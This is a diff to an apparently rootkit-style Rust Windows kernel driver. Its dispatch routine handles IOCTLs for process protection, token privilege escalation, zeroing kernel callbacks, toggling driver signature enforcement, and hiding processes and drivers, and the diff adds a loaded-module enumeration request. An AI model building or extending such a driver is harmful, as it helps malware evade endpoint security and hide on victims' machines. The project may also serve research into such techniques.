@@ -19,8 +19,8 @@ use winapi::{km::wdm::IO_PRIORITY::IO_NO_INCREMENT, shared::ntstatus::{STATUS_BU
 use winapi::km::wdm::{DRIVER_OBJECT, IoCreateDevice, PDEVICE_OBJECT, IoCreateSymbolicLink, IRP_MJ, DEVICE_OBJECT, IRP, IoCompleteRequest, IoGetCurrentIrpStackLocation, IoDeleteSymbolicLink, IoDeleteDevice, DEVICE_TYPE};
 use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING, FALSE, NT_SUCCESS, TRUE};
 use winapi::shared::ntstatus::{STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
-use common::{IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, IOCTL_PROCESS_HIDE_REQUEST, IOCTL_DRIVER_HIDE_REQUEST, CallBackInformation, TargetProcess, TargetCallback, DriverSignatureEnforcement};
-use crate::{callbacks::{PsSetCreateProcessNotifyRoutineEx, process_create_callback, PcreateProcessNotifyRoutineEx, search_loaded_modules, get_loaded_modules}, process::{find_psp_set_create_process_notify, hide::{hide_process, hide_driver}}};
+use common::{IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, IOCTL_PROCESS_HIDE_REQUEST, IOCTL_DRIVER_HIDE_REQUEST, CallBackInformation, TargetProcess, TargetCallback, DriverSignatureEnforcement, IOCTL_DRIVER_ENUM_REQUEST, ModuleInformation};
+use crate::{callbacks::{PsSetCreateProcessNotifyRoutineEx, process_create_callback, PcreateProcessNotifyRoutineEx, search_loaded_modules, get_loaded_modules}, process::{find_psp_set_create_process_notify, hide::{hide_process, hide_driver, get_kernel_loaded_modules}}};
 use crate::process::{protect_process, unprotect_process};
 use crate::string::create_unicode_string;
 use crate::token::enable_all_token_privileges;
@@ -288,6 +288,19 @@ pub extern "system" fn dispatch_device_control(device_object: &mut DEVICE_OBJECT
                 status = STATUS_SUCCESS;
             } else {
                 log::error!("Failed to hide driver");
+                status = STATUS_UNSUCCESSFUL;
+            }
+        },
+        IOCTL_DRIVER_ENUM_REQUEST => {
+            log::info!("IOCTL_DRIVER_ENUM_REQUEST");
+
+            let user_buffer = irp.UserBuffer as *mut ModuleInformation;
+            
+            if let Ok(_result) = get_kernel_loaded_modules(user_buffer, &mut information) {
+                log::info!("Loaded modules enumerate successfully");
+                status = STATUS_SUCCESS;
+            } else {
+                log::error!("Failed enumerate modules");
                 status = STATUS_UNSUCCESSFUL;
             }
         },
